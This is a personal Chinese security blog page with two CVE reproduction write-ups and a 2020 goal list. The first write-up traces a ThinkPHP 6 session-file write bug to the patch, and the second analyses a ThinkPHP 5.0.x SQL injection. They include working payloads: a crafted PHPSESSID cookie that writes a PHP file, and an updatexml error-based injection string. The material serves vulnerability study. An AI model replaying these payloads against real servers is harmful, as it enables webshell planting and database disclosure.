<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http://blog.ccreater.top/page/6/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<pre><code class="php">&lt;?php
namespace app\controller;

use app\BaseController;
use think\facade\Session;
class Index extends BaseController
{
    public function index($name)
    {
        Session::set(&#39;name&#39;, $name);
        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
    }

}</code></pre>
<p><code>\app\middleware.php</code></p>
<pre><code class="php">&lt;?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    // \think\middleware\LoadLangPack::class,
//     Session初始化
     \think\middleware\SessionInit::class
];</code></pre>
<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<pre><code class="php">public function save(): void
    {
        $this-&gt;clearFlashData();//清除原来的数据

        $sessionId = $this-&gt;getId();

        if (!empty($this-&gt;data)) {
            $data = $this-&gt;serialize($this-&gt;data);

            $this-&gt;handler-&gt;write($sessionId, $data);
        } else {
            $this-&gt;handler-&gt;delete($sessionId);
        }

        $this-&gt;init = false;
    }</code></pre>
<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<pre><code class="php">public function write(string $sessID, string $sessData): bool
    {
        $filename = $this-&gt;getFileName($sessID, true);
        $data     = $sessData;

        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this-&gt;writeFile($filename, $data);
    }</code></pre>
<p>再跟进<code>$this-&gt;writeFile</code></p>
<pre><code class="php">protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }</code></pre>
<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this-&gt;config[&#39;prefix&#39;]) {
            // 使用子目录
            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
        } else {
            $name = &#39;sess_&#39; . $name;
        }

        $filename = $this-&gt;config[&#39;path&#39;] . $name;
        $dir      = dirname($filename);

        if ($auto &amp;&amp; !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }</code></pre>
<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<pre><code class="php">    public function getId(): string
    {
        return $this-&gt;id;
    }</code></pre>
<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<pre><code class="php">    public function setId($id = null): void
    {
        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
    }</code></pre>
<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<pre><code class="php">    public function handle($request, Closure $next)
    {
        // Session初始化
        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
        $cookieName   = $this-&gt;session-&gt;getName();

        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
            $sessionId = $request-&gt;request($varSessionId);
        } else {
            $sessionId = $request-&gt;cookie($cookieName);
        }

        if ($sessionId) {
            $this-&gt;session-&gt;setId($sessionId);
        }
    }</code></pre>
<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E

Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php

访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
{
    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
}</code></pre>
<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cka3ckr2c0011v4v08z7p73pm" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2020-02-01T04:53:15.310Z" itemprop="datePublished">2020-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
<p><code>application/index/controller/index.php</code>内容如下</p>
<pre><code class="php">&lt;?php
namespace app\index\controller;

use app\model\Gather;

class Index
{
    public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }
}
</code></pre>
<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
<p>调用堆栈为:</p>
<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
<p>从index()方法开始</p>
<pre><code class="php">public function index()
    {
        $ids = input(&#39;ids/a&#39;);
        $t = db(&quot;user&quot;);
        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();

    }</code></pre>
<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
<pre><code class="php">public function select($data = null)
    {
        ...

        // 分析查询表达式
        $options = $this-&gt;parseExpress();

        ...
        if (!$resultSet) {
            // 生成查询SQL
            $sql = $this-&gt;builder-&gt;select($options);
            // 获取参数绑定
            ...
            }

            ...

    }</code></pre>
<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
<pre><code class="php">protected function parseExpress()
    {
        $options = $this-&gt;options;
        ...
    }</code></pre>
<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
<p>获得<code>$option</code>的调用链为:</p>
<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
<p>跟进去</p>
<pre><code class="php">public function select($options = [])
    {
        $sql = str_replace(
            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],
            [
                $this-&gt;parseTable($options[&#39;table&#39;], $options),
                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),
                $this-&gt;parseField($options[&#39;field&#39;], $options),
                $this-&gt;parseJoin($options[&#39;join&#39;], $options),
                $this-&gt;parseWhere($options[&#39;where&#39;], $options),
                $this-&gt;parseGroup($options[&#39;group&#39;]),
                $this-&gt;parseHaving($options[&#39;having&#39;]),
                $this-&gt;parseOrder($options[&#39;order&#39;], $options),
                $this-&gt;parseLimit($options[&#39;limit&#39;]),
                $this-&gt;parseUnion($options[&#39;union&#39;]),
                $this-&gt;parseLock($options[&#39;lock&#39;]),
                $this-&gt;parseComment($options[&#39;comment&#39;]),
                $this-&gt;parseForce($options[&#39;force&#39;]),
            ], $this-&gt;selectSql);
        return $sql;
    }</code></pre>
<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
<pre><code class="php">protected function parseWhere($where, $options)
    {
        $whereStr = $this-&gt;buildWhere($where, $options);
        ...
        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
    }</code></pre>
<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
<pre><code class="php">public function buildWhere($where, $options)
    {
        if (empty($where)) {
            $where = [];
        }

        if ($where instanceof Query) {
            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);
        }

        $whereStr = &#39;&#39;;
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
            foreach ($val as $field =&gt; $value) {
                ...
                    // 对字段使用表达式查询
                    $field = is_string($field) ? $field : &#39;&#39;;
                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

            }

            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);
        }

        return $whereStr;
    }</code></pre>
<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
<pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)
    {
        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;

        // 查询规则和条件
        if (!is_array($val)) {
            $val = [&#39;=&#39;, $val];
        }
        list($exp, $value) = $val;
        // 字段分析
        if(....){
            ...
        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
            } else {
                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }
                    $this-&gt;query-&gt;bind($bind);
                    $zone = implode(&#39;,&#39;, $array);
                } else {
                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
                }
                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
            }
        } 
        return $whereStr;
    }</code></pre>
<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
<pre><code class="php">                foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }</code></pre>
<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
<p>但是这里只能进行没有子查询语句的sql报错注入</p>
<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
<p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="cka3ckr2a000wv4v0hab15irm" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/31/%E6%88%91%E7%9A%842020/" class="article-date">
  <time class="dt-published" datetime="2020-01-31T15:11:23.717Z" itemprop="datePublished">2020-01-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/31/%E6%88%91%E7%9A%842020/">我的2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
<p>我想要变得更加优秀,我想活出自己</p>
<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>目标是清晰明确的,量化的</li>
<li>目标难度要适合,不能太简单也不能不可实现</li>
<li>如果无法确定今年的目标,那就确定这个月的吧</li>
<li>根据实际情况对目标进行调整</li>
<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
</ol>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
<li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
<li>小目标永远是为大目标/梦想/想法服务的</li>
</ol>
<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
<li>分解细致，能力可达，留有余地</li>
<li>奖惩并行</li>
<li>每个星期总结一次,计划是否合理</li>
</ol>
<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
<li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li>
<li>身体健康,三观尚在 </li>
<li>开发一个类似hexo的python程序</li>
<li>进入补天前1000名</li>
</ol>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p>
<ol>
<li>每专注于目标2个小时就可以任意支配1个小时的时间</li>
<li>专注过程中跑去玩,从头来过,计时清零</li>
<li>没有认真执行,销毁这份计划</li>
</ol>
<h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li>
<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li>
<li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(3/3)</li>
</ul>
<h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p>
<ul>
<li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li>
<li><input disabled="" type="checkbox"> 看完一本书(未定)</li>
<li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li>
<li><input disabled="" type="checkbox"> buuoj40题(8/40)</li>
<li><input disabled="" type="checkbox"> 再挖出20个库币</li>
</ul>
<h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul>
<li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li>
<li><input checked="" disabled="" type="checkbox"> 看完一本书(明朝那些事)</li>
<li><input disabled="" type="checkbox"> buuoj50题(30/50)</li>
<li><input disabled="" type="checkbox"> 挖20个库币(5/20)不是我不努力，一堆重复。。</li>
<li><input disabled="" type="checkbox"> 我的世界写一个mod</li>
</ul>
<h3 id="5月份"><a href="#5月份" class="headerlink" title="5月份"></a>5月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 看完一本书（明朝那些事二）</li>
<li><input disabled="" type="checkbox"> ctf题目50题(14/50)</li>
<li><input checked="" disabled="" type="checkbox"> 补天30个库币(150/30)</li>
<li><input disabled="" type="checkbox"> 渗透靶场3个(0/3)</li>
<li><input disabled="" type="checkbox"> 每天学习8小时以上(20/30)</li>
</ul>
<h3 id="6月份"><a href="#6月份" class="headerlink" title="6月份"></a>6月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 至少阅读一本书</li>
<li><input disabled="" type="checkbox"> 发现有趣的东西</li>
<li><input checked="" disabled="" type="checkbox"> 尝试补天公测，快乐就好</li>
<li><input disabled="" type="checkbox"> 渗透靶场玩玩</li>
<li><input disabled="" type="checkbox"> xctf,rctf …历届题目复现</li>
</ul>
<h3 id="7月份"><a href="#7月份" class="headerlink" title="7月份"></a>7月份</h3><ul>
<li><input disabled="" type="checkbox"> 把<a href="https://portswigger.net/web-security" target="_blank" rel="noopener">burp</a> 里不太会的学完</li>
<li><input disabled="" type="checkbox"> 明朝那些事+ctf特训营web部分</li>
<li><input disabled="" type="checkbox"> 3个靶机，不要看wp，如果看了一定要把不会的内容系统学习，并重新做一遍</li>
<li><input disabled="" type="checkbox"> ctf 10 道好题</li>
<li><input checked="" disabled="" type="checkbox"> 编写新的url资产采集工具</li>
</ul>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p>
<h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p>
<p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
<p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p>
<h3 id="4月份-1"><a href="#4月份-1" class="headerlink" title="4月份"></a>4月份</h3><p>总的来说还是偶尔摸鱼偶尔努力，没有目标，该为未来的工作努力下了。4月和学长一起开发了一个自动漏扫工具感觉还不错。5月份自律下吧，毕竟以前我还是挺自律的。4月份的目标没有全部完成，完成一半大概还是有的。果然反思还是要有点切入点的，不然不知道在写啥。</p>
<h3 id="5月份-1"><a href="#5月份-1" class="headerlink" title="5月份"></a>5月份</h3><p>4月份写的脚本真的很给力，一下挖了很多洞，就是太费时了。。基本上半个月每天4个小时都在挖洞。。。其实整个在家的期间都没有动力，始终都是做着一些重复的劳动，倒没有去学习。希望自己能够因为兴趣而研究，学习。就这样</p>
<h3 id="6月份-1"><a href="#6月份-1" class="headerlink" title="6月份"></a>6月份</h3><p>没有强制任务就开始水了，看来还是得定量一些任务的。其实我一直摸鱼的原因有一部分是因为长时间摸鱼，然后对于进行那些劳累自己心智的任务会有抗拒，有时候逼一下自己就好了。7月份要记录每天所作的事情</p>
